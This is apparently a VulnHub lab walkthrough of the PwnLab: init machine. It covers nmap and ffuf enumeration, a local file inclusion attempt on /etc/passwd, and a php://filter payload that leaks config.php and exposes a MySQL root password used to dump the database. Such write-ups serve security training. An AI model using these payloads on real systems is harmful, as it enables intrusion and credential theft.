# PWNLAB: INIT

## 1.Get VM IP
```text
root@kali~# nmap -sn 192.168.127.0/24
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 06:51 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00023s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.133
Host is up (0.00022s latency).
MAC Address: 00:0C:29:31:80:7A (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00010s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.04 seconds
```
the ip address is `192.168.127.133`, so we begin the enumeration phase

## 2.Enumeration
```text
root@kali~# nmap -sV -sC 192.168.127.133 -oN fullscan

Host is up (0.0027s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41057/tcp   status
|   100024  1          44335/tcp6  status
|   100024  1          46125/udp   status
|_  100024  1          53161/udp6  status
3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, FoundRows, InteractiveClient, Speaks41ProtocolNew, LongPassword, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, ODBCClient, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, SupportsTransactions, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: YsV6HIt.(zP`r?")FgSI
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:31:80:7A (VMware)
```
so the box has port `80` and ofcourse a mysql database on port `3306`

exploring the port 80 will result in the page where it has 3 menues :

![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f421609a-cf40-42b6-8dc3-717436dffea9)

at the same time fuzzing the applicaton shows extra directories :

```text
root@kali~# ffuf -w ~/wordlist/raft-large-directories.txt -u http://192.168.127.133/FUZZ
```

![ffuf](https://github.com/Git-K3rnel/VulnHub/assets/127470407/967d85bd-b4d0-468e-963a-89ab69ab2d1f)


another fuzzing :

```text
root@kali~# ffuf -w ~/wordlist/raft-medium-words.txt -u http://192.168.127.133/FUZZ/ -e .php,.zip,.rar,.png,.key,.jpg,.bak,.backup -fc 403
```

![ffuf2](https://github.com/Git-K3rnel/VulnHub/assets/127470407/66b48b19-42f8-4a8c-9164-8d14458c535b)

found `config.php` in this fuzz.

back to website at login menue :

![loginpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2b717679-27b0-4d26-862a-650c4b22ea8e)

look at the url parameter `page`, try different `LFI` payloads bur didnot work:

```text
http://192.168.127.133/?page=../../../../../../../../etc/passwd
```

i decided to test if i can convert the php source code into base64 encode using php `filter` :

```text
http://192.168.127.133/?page=php://filter/convert.base64-encode/resource=config
```

![config](https://github.com/Git-K3rnel/VulnHub/assets/127470407/44ab7fc1-3fb1-4424-93ea-30482e87ba38)

 and after decoding the base64 i got the following code :

 ```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?> 
```

yes, we have mysql root password, try to connect to it :

```text
root@kali~# mysql -u root -h 192.168.127.133 -p
```

provide the password and get all the information from database :

![mysql](https://github.com/Git-K3rnel/VulnHub/assets/127470407/e1257850-8b93-462d-a687-4953066e060a)


